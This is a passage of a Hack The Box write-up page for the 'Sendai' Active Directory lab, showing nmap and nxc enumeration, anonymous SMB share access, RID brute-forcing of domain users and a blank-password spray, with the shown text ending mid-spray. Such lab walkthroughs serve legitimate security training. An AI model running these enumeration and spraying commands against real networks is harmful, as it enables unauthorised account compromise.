@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Sendai | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Sendai" /><meta property="og:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/og.png?v=fd1f50bd" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Sendai" /><meta name="twitter:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/og.png?v=fd1f50bd" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Sendai","description":"Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Sendai","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sendai/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Sendai</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 22 min read</p><h1>Sendai</h1><p>Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Password spray leads to user compromise, Kerberoasting.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Sendai" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-sendai.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-sendai.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Sendai</h2><p>Sendai is a medium-difficulty Windows Active Directory machine focused on weak account hygiene, GMSA abuse, and ADCS misconfigurations. Initial access is gained through anonymous SMB enumeration, revealing files that hint at expired accounts with weak passwords. RID…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>28 Aug 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.9 / 5</dd></div><div><dt>User owns</dt><dd>1,110</dd></div><div><dt>Root owns</dt><dd>993</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 25S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 25S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 734 votes from easiest to hardest"><rect x="0" y="55" width="20" height="9" rx="2" fill="hsl(96 70% 55%)"><title>28 votes</title></rect><rect x="26" y="55" width="20" height="9" rx="2" fill="hsl(96 70% 55%)"><title>30 votes</title></rect><rect x="52" y="3" width="20" height="61" rx="2" fill="hsl(80 70% 55%)"><title>201 votes</title></rect><rect x="78" y="13" width="20" height="51" rx="2" fill="hsl(70 70% 55%)"><title>167 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>210 votes</title></rect><rect x="130" y="47" width="20" height="17" rx="2" fill="hsl(38 70% 55%)"><title>55 votes</title></rect><rect x="156" y="55" width="20" height="9" rx="2" fill="hsl(28 70% 55%)"><title>31 votes</title></rect><rect x="182" y="62" width="20" height="2" rx="2" fill="hsl(16 70% 55%)"><title>3 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>2 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>7 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.6, Real-Life 8.1, CVE 5.2, Custom Exploitation 4.8, CTF-Like 1.9"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,56.8 163.9,92.5 131.4,139.4 90.3,137.2 97.4,105.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Sendai" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file Setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.234.66 --generate-hosts-file /etc/hosts                         
+[sudo] password for kali: 
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><p>This setup my hosts file for me now ill start with enumeration</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=3000 10.129.234.66        
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 14:53 +0000
+Nmap scan report for 10.129.234.66
+Host is up (0.013s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+50946/tcp open  unknown
+58240/tcp open  unknown
+58241/tcp open  unknown
+58256/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 44.50 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=3000 10.129.234.66
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-03 14:55 +0000
+Nmap scan report for DC.sendai.vl (10.129.234.66)
+Host is up (0.014s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-03 14:56:03Z)
+
+135/tcp  open  msrpc         Microsoft Windows RPC
+
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+
+445/tcp  open  microsoft-ds?
+
+464/tcp  open  kpasswd5?
+
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SENDAI
+|   NetBIOS_Domain_Name: SENDAI
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: sendai.vl
+|   DNS_Computer_Name: dc.sendai.vl
+|   DNS_Tree_Name: sendai.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-03T14:56:47+00:00
+|_ssl-date: 2026-03-03T14:57:27+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Not valid before: 2026-03-02T14:52:53
+|_Not valid after:  2026-09-01T14:52:53
+
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+
+9389/tcp open  mc-nmf        .NET Message Framing
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>The DC is running on the same time as me so i wont have to sync the time I already have the DC name and the domain name from my nxc command earlier</p><h2>SMB (445)</h2><h3>Anonymous logon</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient -L \\\\DC.sendai.vl\\                               
+Password for [WORKGROUP\kali]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	config          Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	sendai          Disk      company share
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to DC.sendai.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</code></pre><p>Looks like anonymous logon was successful and i can list shares There are some non-default shares, <code>config</code> <code>sendai</code> and <code>Users</code> The others are default, but it still might be worth running Get-GPPPassword.py on this to find group policy passwords No luck on group policy passwords</p><h3>Access to shares as guest/anonymous</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u Guest -p &#39;&#39; --shares
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
+SMB         10.129.234.66   445    DC               [*] Enumerated shares
+SMB         10.129.234.66   445    DC               Share           Permissions     Remark
+SMB         10.129.234.66   445    DC               -----           -----------     ------
+SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.66   445    DC               C$                              Default share
+SMB         10.129.234.66   445    DC               config                          
+SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.66   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.234.66   445    DC               sendai          READ            company share
+SMB         10.129.234.66   445    DC               SYSVOL                          Logon server share 
+SMB         10.129.234.66   445    DC               Users           READ</code></pre><h3>Access to <code>sendai</code> share</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient \\\\DC.sendai.vl\\sendai
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jul 18 18:31:04 2023
+  ..                                DHS        0  Wed Apr 16 03:55:42 2025
+  hr                                  D        0  Tue Jul 11 13:58:19 2023
+  incident.txt                        A     1372  Tue Jul 18 18:34:15 2023
+  it                                  D        0  Tue Jul 18 14:16:46 2023
+  legal                               D        0  Tue Jul 11 13:58:23 2023
+  security                            D        0  Tue Jul 18 14:17:35 2023
+  transfer                            D        0  Tue Jul 11 14:00:20 2023
+
+		7019007 blocks of size 4096. 899700 blocks available
+smb: \&gt; </code></pre><p>I have access to this share, i could not list anything in the config share I also have access to the <code>Users</code> share but there isnt anything interesting there The transfer directory has a list of empty directories that look like they belong to users The hr directory is empty The security directory has a guidelines text file which doesnt have anything interesting</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smb: \it\&gt; ls
+  .                                   D        0  Tue Jul 18 14:16:46 2023
+  ..                                  D        0  Tue Jul 18 18:31:04 2023
+  Bginfo64.exe                        A  2774440  Tue Jul 18 14:16:43 2023
+  PsExec64.exe                        A   833472  Tue Jul 18 14:16:38 2023
+
+		7019007 blocks of size 4096. 1237984 blocks available
+smb: \it\&gt; 
+</code></pre><p>Found some interesting .exe files in the <code>it</code> share</p><h4><code>incident.txt</code> file from <code>sendai</code> share</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat incident.txt 
+Dear valued employees,
+
+We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.
+
+To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.
+
+We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.
+
+If you need assistance or have any questions regarding the password reset procedure, please don&#39;t hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.
+
+Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.</code></pre><p>So this note explains the newest update for passwords on accounts</p><h3>Users on the domain</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u &#39;Guest&#39; -p &#39;&#39; --rid-brute
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
+SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
+SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
+SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
+SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
+SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
+SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
+SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
+SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
+SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
+SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
+SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
+SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
+SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
+SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
+SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
+SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
+SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
+SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
+SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
+SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
+SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
+SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
+SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
+SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
+SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
+SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
+SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)</code></pre><p>Using the <code>cut</code> command ive put this into a users file I used this list to try some as-rep roasting, however this failed</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb DC.sendai.vl -u users.txt -p &#39;&#39; --continue-on-success
+SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
+SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
